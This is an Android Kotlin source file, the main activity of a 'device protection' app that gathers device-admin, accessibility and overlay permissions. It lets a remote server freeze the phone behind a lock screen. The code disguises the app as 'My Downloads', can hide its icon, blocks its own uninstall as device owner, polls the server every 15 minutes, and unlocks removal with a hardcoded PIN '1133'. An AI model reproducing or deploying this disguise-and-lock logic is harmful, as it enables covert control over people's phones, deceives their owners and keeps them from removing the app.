package com.example.deviceadmin

import android.accessibilityservice.AccessibilityServiceInfo
import android.animation.ObjectAnimator
import android.app.DownloadManager
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.view.View
import android.view.accessibility.AccessibilityManager
import android.view.animation.AccelerateDecelerateInterpolator
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import com.example.deviceadmin.databinding.ActivityMainBinding
import kotlinx.coroutines.*
import com.google.android.material.dialog.MaterialAlertDialogBuilder
import com.google.android.material.textfield.TextInputEditText
import java.util.concurrent.TimeUnit
import android.util.Log
import okhttp3.OkHttpClient
import okhttp3.logging.HttpLoggingInterceptor
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding
    private lateinit var devicePolicyManager: DevicePolicyManager
    private lateinit var adminComponent: ComponentName
    private var isDeviceIdSaved = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        adminComponent = ComponentName(this, MyDeviceAdminReceiver::class.java)

        setupUIListeners()
        handleLaunchLogic()
        animateEntrance()
    }

    private fun animateEntrance() {
        binding.setupContainer.alpha = 0f
        binding.setupContainer.translationY = 50f
        binding.setupContainer.animate()
            .alpha(1f)
            .translationY(0f)
            .setDuration(400)
            .setInterpolator(AccelerateDecelerateInterpolator())
            .start()
    }

    override fun onStart() {
        super.onStart()
        // No need to trigger WorkManager here as handleLaunchLogic 
        // already performs a real-time eager sync.
    }

    private fun setupUIListeners() {
        // Permission clicks
        binding.permissionDeviceAdmin.setOnClickListener {
            animateClick(it)
            if (!devicePolicyManager.isAdminActive(adminComponent)) {
                requestDeviceAdmin()
            }
        }

        binding.permissionAccessibility.setOnClickListener {
            animateClick(it)
            if (!isAccessibilityServiceEnabled()) {
                requestAccessibilityPermission()
            }
        }

        binding.permissionOverlay.setOnClickListener {
            animateClick(it)
            if (!isOverlayPermissionGranted()) {
                requestOverlayPermission()
            }
        }

        // Save Device ID
        binding.saveDeviceIdButton.setOnClickListener {
            animateClick(it)
            saveDeviceId()
        }

        // Edit Device ID (show input card again)
        binding.editDeviceIdButton.setOnClickListener {
            animateClick(it)
            editDeviceId()
        }

        // Complete Setup
        binding.completeSetupButton.setOnClickListener {
            animateClick(it)
            if (hasAllPermissions() && isDeviceIdSaved) {
                completeSetup()
            } else if (!isDeviceIdSaved) {
                showToast("Please save Device ID first")
            } else {
                showToast("Please grant all permissions first")
            }
        }

        // Remove Setup
        binding.removeSetupButton.setOnClickListener {
            animateClick(it)
            showRemoveSetupDialog()
        }

        // Test Lock Screen
        binding.testLockButton.setOnClickListener {
            animateClick(it)
            testLockScreen()
        }
    }

    private fun editDeviceId() {
        // Animate: hide saved card, show input card with current value
        val currentId = binding.savedDeviceIdText.text.toString()
        
        binding.deviceIdSavedCard.animate()
            .alpha(0f)
            .setDuration(200)
            .withEndAction {
                binding.deviceIdSavedCard.visibility = View.GONE
                binding.deviceIdInput.setText(currentId)
                binding.deviceIdInput.isEnabled = true
                binding.saveDeviceIdButton.text = "Save Device ID"
                binding.saveDeviceIdButton.isEnabled = true
                binding.deviceIdInputCard.alpha = 0f
                binding.deviceIdInputCard.visibility = View.VISIBLE
                binding.deviceIdInputCard.animate()
                    .alpha(1f)
                    .setDuration(200)
                    .start()
                
                // Focus on input
                binding.deviceIdInput.requestFocus()
            }
            .start()
        
        isDeviceIdSaved = false
        updateAddProtectionButton()
    }

    private fun animateClick(view: View) {
        view.animate()
            .scaleX(0.95f)
            .scaleY(0.95f)
            .setDuration(100)
            .withEndAction {
                view.animate()
                    .scaleX(1f)
                    .scaleY(1f)
                    .setDuration(100)
                    .start()
            }
            .start()
    }

    private fun saveDeviceId() {
        val deviceId = binding.deviceIdInput.text?.toString()?.trim()
        
        if (deviceId.isNullOrEmpty()) {
            binding.deviceIdInputLayout.error = "Please enter a Device ID"
            shakeView(binding.deviceIdInputLayout)
            return
        }
        
        binding.deviceIdInputLayout.error = null
        
        val prefs = getSharedPreferences("app_prefs", Context.MODE_PRIVATE)
        prefs.edit().putString("device_id", deviceId).apply()
        
        // Backup to Settings.Global if Device Owner
        try {
            if (devicePolicyManager.isDeviceOwnerApp(packageName)) {
                Settings.Global.putString(contentResolver, "com.example.deviceadmin.DEVICE_ID", deviceId)
            }
        } catch (e: Exception) {
            Log.e("MainActivity", "Failed to backup ID: ${e.message}")
        }
        
        isDeviceIdSaved = true
        
        // Animate transition: hide input card, show saved card
        binding.deviceIdInputCard.animate()
            .alpha(0f)
            .setDuration(200)
            .withEndAction {
                binding.deviceIdInputCard.visibility = View.GONE
                binding.savedDeviceIdText.text = deviceId
                binding.deviceIdSavedCard.alpha = 0f
                binding.deviceIdSavedCard.visibility = View.VISIBLE
                binding.deviceIdSavedCard.animate()
                    .alpha(1f)
                    .setDuration(200)
                    .start()
            }
            .start()
        updateAddProtectionButton()
        showToast("Device ID saved")
    }

    private fun shakeView(view: View) {
        val shake = ObjectAnimator.ofFloat(view, "translationX", 0f, 15f, -15f, 10f, -10f, 5f, -5f, 0f)
        shake.duration = 400
        shake.start()
    }

    private fun handleLaunchLogic() {
        val showAdminPanel = intent.getBooleanExtra("SHOW_ADMIN_PANEL", false)
        val prefs = getSharedPreferences("app_prefs", Context.MODE_PRIVATE)
        val isSetupComplete = prefs.getBoolean("setup_complete", false)
        val hasPermissions = hasAllPermissions()
        
        // Check if server has disabled protection
        val serverProtection = prefs.getString("protection", "enabled")
        val isProtectionDisabledByServer = serverProtection?.equals("disabled", ignoreCase = true) == true
        
        // Initial check from local prefs
        val phoneState = prefs.getString("phone_state", "Active")
        val isFrozen = phoneState?.trim()?.equals("Freeze", ignoreCase = true) == true
        
        Log.d("MainActivity", "=== LAUNCH LOGIC (Initial) ===")
        Log.d("MainActivity", "isSetupComplete: $isSetupComplete, phoneState: $phoneState")
        
        // Priority 1: If already frozen locally, go to LockActivity immediately
        if (isFrozen && !isProtectionDisabledByServer && isSetupComplete) {
            redirectToLock()
            return
        }

        // Priority 2: If setup is complete, do an EAGER sync before deciding to go stealth
        if (isSetupComplete && !showAdminPanel && !isProtectionDisabledByServer) {
            performEagerSyncAndCheck()
        } else {
            // Show setup UI if needed
            if (showAdminPanel || !hasPermissions || !isSetupComplete || isProtectionDisabledByServer) {
                showSetupUI(!showAdminPanel)
            } else {
                openDownloadsAndClose()
            }
        }
    }

    private fun performEagerSyncAndCheck() {
        val prefs = getSharedPreferences("app_prefs", Context.MODE_PRIVATE)
        val deviceId = prefs.getString("device_id", "unknown_device") ?: "unknown_device"
        
        // Show a simple blank screen or stay on splash while checking
        binding.setupContainer.visibility = View.GONE
        
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val logging = HttpLoggingInterceptor().apply {
                    level = HttpLoggingInterceptor.Level.BODY
                }
                val client = OkHttpClient.Builder()
                    .addInterceptor(logging)
                    .build()
                    
                val retrofit = Retrofit.Builder()
                    .baseUrl("https://api.miniclickcrm.com/")
                    .client(client)
                    .addConverterFactory(GsonConverterFactory.create())
                    .build()

                val service = retrofit.create(ApiService::class.java)
                val response = service.getStatus(deviceId).execute()

                if (response.isSuccessful) {
                    val status = response.body()
                    val remoteFrozen = status?.isFreezed ?: false
                    
                    // Save the new state immediately
                    val remoteProtection = if (status?.isProtected == false) "disabled" else "enabled"
                    prefs.edit()
                        .putString("phone_state", if (remoteFrozen) "Freeze" else "Active")
                        .putString("protection", remoteProtection)
                        .apply()

                    withContext(Dispatchers.Main) {
                        if (remoteFrozen && remoteProtection == "enabled") {
                            redirectToLock()
                        } else if (remoteProtection == "disabled") {
                            showSetupUI(false)
                        } else {
                            openDownloadsAndClose()
                        }
                    }
                } else {
                    // Fail-safe: trust local data
                    withContext(Dispatchers.Main) {
                        openDownloadsAndClose()
                    }
                }
            } catch (e: Exception) {
                withContext(Dispatchers.Main) {
                    openDownloadsAndClose()
                }
            }
        }
    }

    private fun redirectToLock() {
        Log.d("MainActivity", "-> Redirecting to LockActivity")
        val lockIntent = Intent(this, LockActivity::class.java)
        lockIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
        startActivity(lockIntent)
        finish()
    }

    private fun showSetupUI(@Suppress("UNUSED_PARAMETER") isForcedSetup: Boolean) {
        binding.setupContainer.visibility = View.VISIBLE
        updatePermissionStatusUI()
        
        val prefs = getSharedPreferences("app_prefs", Context.MODE_PRIVATE)
        val isSetupComplete = prefs.getBoolean("setup_complete", false)
        
        // Hide switch on Android 11+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            binding.hideIconCard.visibility = View.GONE
        }
        
        // Show Admin Zone only when protection is enabled
        binding.adminZoneContainer.visibility = if (isSetupComplete) View.VISIBLE else View.GONE
        
        // Load saved Device ID
        var savedId = prefs.getString("device_id", "")
        
        if (savedId.isNullOrEmpty()) {
            try {
                savedId = Settings.Global.getString(contentResolver, "com.example.deviceadmin.DEVICE_ID")
            } catch (e: Exception) { }
        }

        if (!savedId.isNullOrEmpty()) {
            // Device ID already saved - show saved card, hide input card
            isDeviceIdSaved = true
            binding.deviceIdInputCard.visibility = View.GONE
            binding.deviceIdSavedCard.visibility = View.VISIBLE
            binding.savedDeviceIdText.text = savedId
            
            // Hide edit button if protection is already enabled
            binding.editDeviceIdButton.visibility = if (isSetupComplete) View.GONE else View.VISIBLE
            
            prefs.edit().putString("device_id", savedId).apply()
        } else {
            // No saved ID - show input card, hide saved card
            isDeviceIdSaved = false
            binding.deviceIdInputCard.visibility = View.VISIBLE
            binding.deviceIdSavedCard.visibility = View.GONE
        }
        
        updateAddProtectionButton()
    }

    private fun updatePermissionStatusUI() {
        val isAdminActive = devicePolicyManager.isAdminActive(adminComponent)
        val isAccessibilityEnabled = isAccessibilityServiceEnabled()
        val isOverlayGranted = isOverlayPermissionGranted()
        
        // Update Device Admin status
        updatePermissionRow(
            binding.permissionDeviceAdminStatus,
            isAdminActive
        )
        
        // Update Accessibility status
        updatePermissionRow(
            binding.permissionAccessibilityStatus,
            isAccessibilityEnabled
        )
        
        // Update Overlay status
        updatePermissionRow(
            binding.permissionOverlayStatus,
            isOverlayGranted
        )
        
        updateAddProtectionButton()
    }

    private fun updatePermissionRow(statusView: TextView, isGranted: Boolean) {
        if (isGranted) {
            statusView.text = "Granted"
            statusView.setTextColor(Color.parseColor("#3FB950"))
            statusView.setBackgroundResource(R.drawable.permission_badge_granted)
        } else {
            statusView.text = "Grant"
            statusView.setTextColor(Color.parseColor("#F85149"))
            statusView.setBackgroundResource(R.drawable.permission_badge_pending)
        }
    }

    private fun updateAddProtectionButton() {
        val canComplete = hasAllPermissions() && isDeviceIdSaved
        binding.completeSetupButton.isEnabled = canComplete
        
        if (canComplete) {
            binding.completeSetupButton.alpha = 1f
        } else {
            binding.completeSetupButton.alpha = 0.5f
        }
    }
    
    
    private fun completeSetup() {
        val deviceId = binding.deviceIdInput.text?.toString()?.trim()
        val prefs = getSharedPreferences("app_prefs", Context.MODE_PRIVATE)
        
        if (!deviceId.isNullOrEmpty()) {
            prefs.edit().putString("device_id", deviceId).apply()
        }

        prefs.edit()
            .putBoolean("setup_complete", true)
            .putBoolean("uninstall_allowed", false)
            .apply()

        scheduleBackgroundWork()
        refreshDeviceOwnerRestrictions()
        
        val shouldHide = binding.hideIconSwitch.isChecked
        
        if (shouldHide && Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            showToast("Hiding Icon...")
            AppIconManager.hideAppIcon(this)
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                finishAndRemoveTask()
            }, 3000)
        } else {
            showSuccessAnimation()
        }
    }

    private fun showSuccessAnimation() {
        val dialog = MaterialAlertDialogBuilder(this, com.google.android.material.R.style.ThemeOverlay_Material3_MaterialAlertDialog)
            .setTitle("🛡️ Protection Added")
            .setMessage("Device is now protected. The app will now disguise as 'My Downloads'.")
            .setPositiveButton("OK") { _, _ ->
                finishAndRemoveTask()
            }
            .setCancelable(false)
            .create()
        
        dialog.show()
        
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            if (dialog.isShowing) {
                dialog.dismiss()
                finishAndRemoveTask()
            }
        }, 3000)
    }

    private fun openDownloadsAndClose() {
        getSharedPreferences("app_prefs", Context.MODE_PRIVATE)
            .edit().putBoolean("uninstall_allowed", false).apply()

        // Background check is already triggered in onStart()
        
        try {
            val intent = Intent(DownloadManager.ACTION_VIEW_DOWNLOADS)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
        } catch (e: Exception) {
            try {
                val intent = Intent(Intent.ACTION_GET_CONTENT)
                intent.type = "*/*"
                intent.addCategory(Intent.CATEGORY_OPENABLE)
                startActivity(intent)
            } catch (ignore: Exception) {}
        }
        
        finishAndRemoveTask()
    }

    private fun showRemoveSetupDialog() {
        val prefs = getSharedPreferences("app_prefs", Context.MODE_PRIVATE)
        val serverProtection = prefs.getString("protection", "enabled")
        val isProtectionDisabledByServer = serverProtection?.equals("disabled", ignoreCase = true) == true
        
        // If server already disabled protection, skip PIN verification
        if (isProtectionDisabledByServer) {
            removeProtection()
            return
        }
        
        // Server protection is enabled - require PIN
        val dialogView = layoutInflater.inflate(R.layout.dialog_pin_input, null)
        val pinInput = dialogView.findViewById<TextInputEditText>(R.id.pinInput)
        
        val dialog = MaterialAlertDialogBuilder(this, com.google.android.material.R.style.ThemeOverlay_Material3_MaterialAlertDialog)
            .setTitle("🔐 Remove Protection")
            .setMessage("Enter Master PIN to remove protection:")
            .setView(dialogView)
            .setPositiveButton("Verify") { _, _ ->
                verifyPinAndRemove(pinInput.text.toString())
            }
            .setNegativeButton("Cancel", null)
            .create()
        
        dialog.show()
    }

    private fun removeProtection() {
        val prefs = getSharedPreferences("app_prefs", Context.MODE_PRIVATE)
        prefs.edit()
            .putBoolean("uninstall_allowed", true)
            .putBoolean("setup_complete", false)
            .putString("protection", "disabled")
            .putString("phone_state", "Active")
            .apply()
        
        // Clear all dpm restrictions immediately if possible
        if (devicePolicyManager.isDeviceOwnerApp(packageName)) {
            try {
                devicePolicyManager.setUninstallBlocked(adminComponent, packageName, false)
                devicePolicyManager.clearUserRestriction(adminComponent, android.os.UserManager.DISALLOW_UNINSTALL_APPS)
                devicePolicyManager.clearUserRestriction(adminComponent, android.os.UserManager.DISALLOW_APPS_CONTROL)
            } catch (e: Exception) {}
        }
        
        showSetupUI(false)
        showProtectionRemovedDialog()
    }

    private fun testLockScreen() {
        val prefs = getSharedPreferences("app_prefs", Context.MODE_PRIVATE)
        prefs.edit()
            .putString("phone_state", "Freeze")
            .putString("last_status", "LOCK")
            .apply()
        
        redirectToLock()
    }

    private fun verifyPinAndRemove(pin: String) {
        if (pin == "1133") {
            removeProtection()
        } else {
            showToast("Incorrect PIN")
            shakeView(binding.removeSetupButton)
        }
    }

    private fun showProtectionRemovedDialog() {
        MaterialAlertDialogBuilder(this, com.google.android.material.R.style.ThemeOverlay_Material3_MaterialAlertDialog)
            .setTitle("✅ Protection Removed")
            .setMessage("Device protection has been disabled. You can now uninstall the app from Settings.")
            .setPositiveButton("Open App Settings") { _, _ ->
                val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                intent.data = Uri.parse("package:$packageName")
                startActivity(intent)
            }
            .setNegativeButton("Close", null)
            .show()
    }
    
    private fun showToast(message: String) {
        Toast.makeText(this, message, Toast.LENGTH_SHORT).show()
    }
    
    private fun scheduleBackgroundWork() {
        val workManager = WorkManager.getInstance(this)
        val periodicWork = PeriodicWorkRequestBuilder<StatusWorker>(15, TimeUnit.MINUTES).build()
        workManager.enqueueUniquePeriodicWork("StatusCheck", ExistingPeriodicWorkPolicy.KEEP, periodicWork)
        workManager.enqueue(OneTimeWorkRequestBuilder<StatusWorker>().build())
    }

    private fun hasAllPermissions() = devicePolicyManager.isAdminActive(adminComponent) && 
               isAccessibilityServiceEnabled() && isOverlayPermissionGranted()

    private fun refreshDeviceOwnerRestrictions() {
        if (devicePolicyManager.isDeviceOwnerApp(packageName)) {
            try {
                devicePolicyManager.setUninstallBlocked(adminComponent, packageName, true)
                devicePolicyManager.addUserRestriction(adminComponent, android.os.UserManager.DISALLOW_UNINSTALL_APPS)
                devicePolicyManager.addUserRestriction(adminComponent, android.os.UserManager.DISALLOW_APPS_CONTROL)
                Log.d("MainActivity", "Device Owner restrictions refreshed")
            } catch (e: Exception) {
                Log.e("MainActivity", "Failed to refresh restrictions: ${e.message}")
            }
        }
    }

    private fun requestDeviceAdmin() {
        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for device protection.")
        @Suppress("DEPRECATION")
        startActivityForResult(intent, REQUEST_DEVICE_ADMIN)
    }

    private fun requestAccessibilityPermission() {
        MaterialAlertDialogBuilder(this, com.google.android.material.R.style.ThemeOverlay_Material3_MaterialAlertDialog)
            .setTitle("Accessibility Required")
            .setMessage("Enable Accessibility Service for 'My Downloads' / 'Device Controller' to enable protection features.")
            .setPositiveButton("Open Settings") { _, _ ->
                startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
            }
            .setNegativeButton("Cancel", null)
            .show()
    }
    
    private fun requestOverlayPermission() {
        MaterialAlertDialogBuilder(this, com.google.android.material.R.style.ThemeOverlay_Material3_MaterialAlertDialog)
            .setTitle("Overlay Required")
            .setMessage("Allow 'Display over other apps' permission to show lock screen.")
            .setPositiveButton("Open Settings") { _, _ ->
                @Suppress("DEPRECATION")
                startActivityForResult(
                    Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")),
                    REQUEST_OVERLAY_PERMISSION
                )
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        val expectedComponentName = ComponentName(this, LockAccessibilityService::class.java)
        val enabledServicesSetting = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: ""
        val stringColonSplitter = android.text.TextUtils.SimpleStringSplitter(':')
        stringColonSplitter.setString(enabledServicesSetting)
        
        while (stringColonSplitter.hasNext()) {
            val componentNameString = stringColonSplitter.next()
            val enabledComponent = ComponentName.unflattenFromString(componentNameString)
            if (enabledComponent != null && enabledComponent == expectedComponentName) {
                return true
            }
        }
        
        val am = getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
        val enabledServices = am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK)
        for (service in enabledServices) {
            if (service.resolveInfo.serviceInfo.packageName == packageName) {
                return true
            }
        }
        return false
    }

    private fun isOverlayPermissionGranted(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) Settings.canDrawOverlays(this) else true
    }

    override fun onResume() {
        super.onResume()
        if (binding.setupContainer.visibility == View.VISIBLE) {
            binding.root.postDelayed({
                updatePermissionStatusUI()
            }, 500)
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        updatePermissionStatusUI()
    }

    companion object {
        private const val REQUEST_DEVICE_ADMIN = 1
        private const val REQUEST_OVERLAY_PERMISSION = 2
    }
}
